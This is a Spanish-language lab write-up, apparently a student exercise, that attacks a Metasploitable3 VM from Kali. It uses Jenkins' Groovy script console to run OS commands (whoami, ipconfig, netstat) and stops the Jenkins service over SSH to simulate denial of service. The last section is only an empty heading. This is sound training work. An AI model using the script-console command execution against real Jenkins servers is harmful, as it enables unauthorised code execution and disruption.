---
title: "Lab 03 - Kill Chain 2"
date: 2026-06-15 00:12:00
categories: [lab, setup]
tags: [metasploitable, virtualbox, kali, kill Chain, Jenkins]
---

# 1 VERIFICAR QUE JENKINS ESTA ACTIVO EN METASPLOITABLE3
Para realizar esta tarea tenemos 2 opciones:
* Hacerlo desde Kali.
* Hacerlo desde Metasploitable3

## Opción A (desde Kali)
Para realizar este paso ejecutamos el siguiente comando:

```
curl -s -o /dev/null -w "%{http_code}" http://10.0.2.3:8484/
```

Debemos tener como respuesta: 200

![RESPUESTA DE OPCION A](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781500894/opcion_a_rbp2rr.png)

## Opción B (desde Metasploitable3)
Para realizarlo por esta opción primero debemos conectarnos vía SSH

```
ssh vagrant@10.0.2.3
```

Luego dentro del PowerShell

```
netstat -ano | findstr :8484
```

Obteniendo que Jenkins y puerto 8484 en LISTENING

![RESPUESTA DE OPCION B](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781501354/opcion_b_qygqn0.png)

# 2 ACCEDER A JENKINS SCRIPT CONSOLE

En el navegador del kali ponemos lo siguiente:

```
http://10.0.2.3:8484/script
```

Obteniendo este resultado

![INGRESO A JENKINGS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781503997/ingreso_a_jenkins_kkmfts.png)

# 3 EJECUTAR COMANDOS GROOVY

En el campo de "Scrip", escribimos el siguiente comando

```
println "cmd /c whoami".execute().text

def cmd = "cmd /c ipconfig"
def proc = cmd.execute()
proc.waitFor()
println proc.text

println "cmd /c netstat -an | findstr 10.0.2.10".execute().text
```

Obteniendo como respuesta lo siguiente

![RESPUESTA DE JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781504976/resultado_jenkins_ct1uyn.png)

# 4 COMANDOS DOS

Primero detendremos Jenkins, desde el kali usaremos el siguiente comando

```
ssh vagrant@10.0.2.3
```

una vez dentro pondremos lo siguiente

```
net stop jenkins
```

Resultando

![DETENER JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781506242/detener_jenkins_whwfuz.png)

Segundo verificamos que Jenkins se detuvo (desde Kali)

```
curl -s -o /dev/null -w "%{http_code}" http://10.0.2.3:8484/
```

Debe salir error, timeout o 000.

![ERROR JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781506489/jenkins_detenido_error_skwjfk.png)

Ahora reiniciamos Jenkins desde el Metasploitable via SSH

```
ssh vagrant@10.0.2.3
```

```
net start jenkins
```

![REACTIVAR JENKINS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781506773/reactivar_jenkins_sv2d1r.png)

# 5 COMANDOS UTILES PARA EXPLORAR









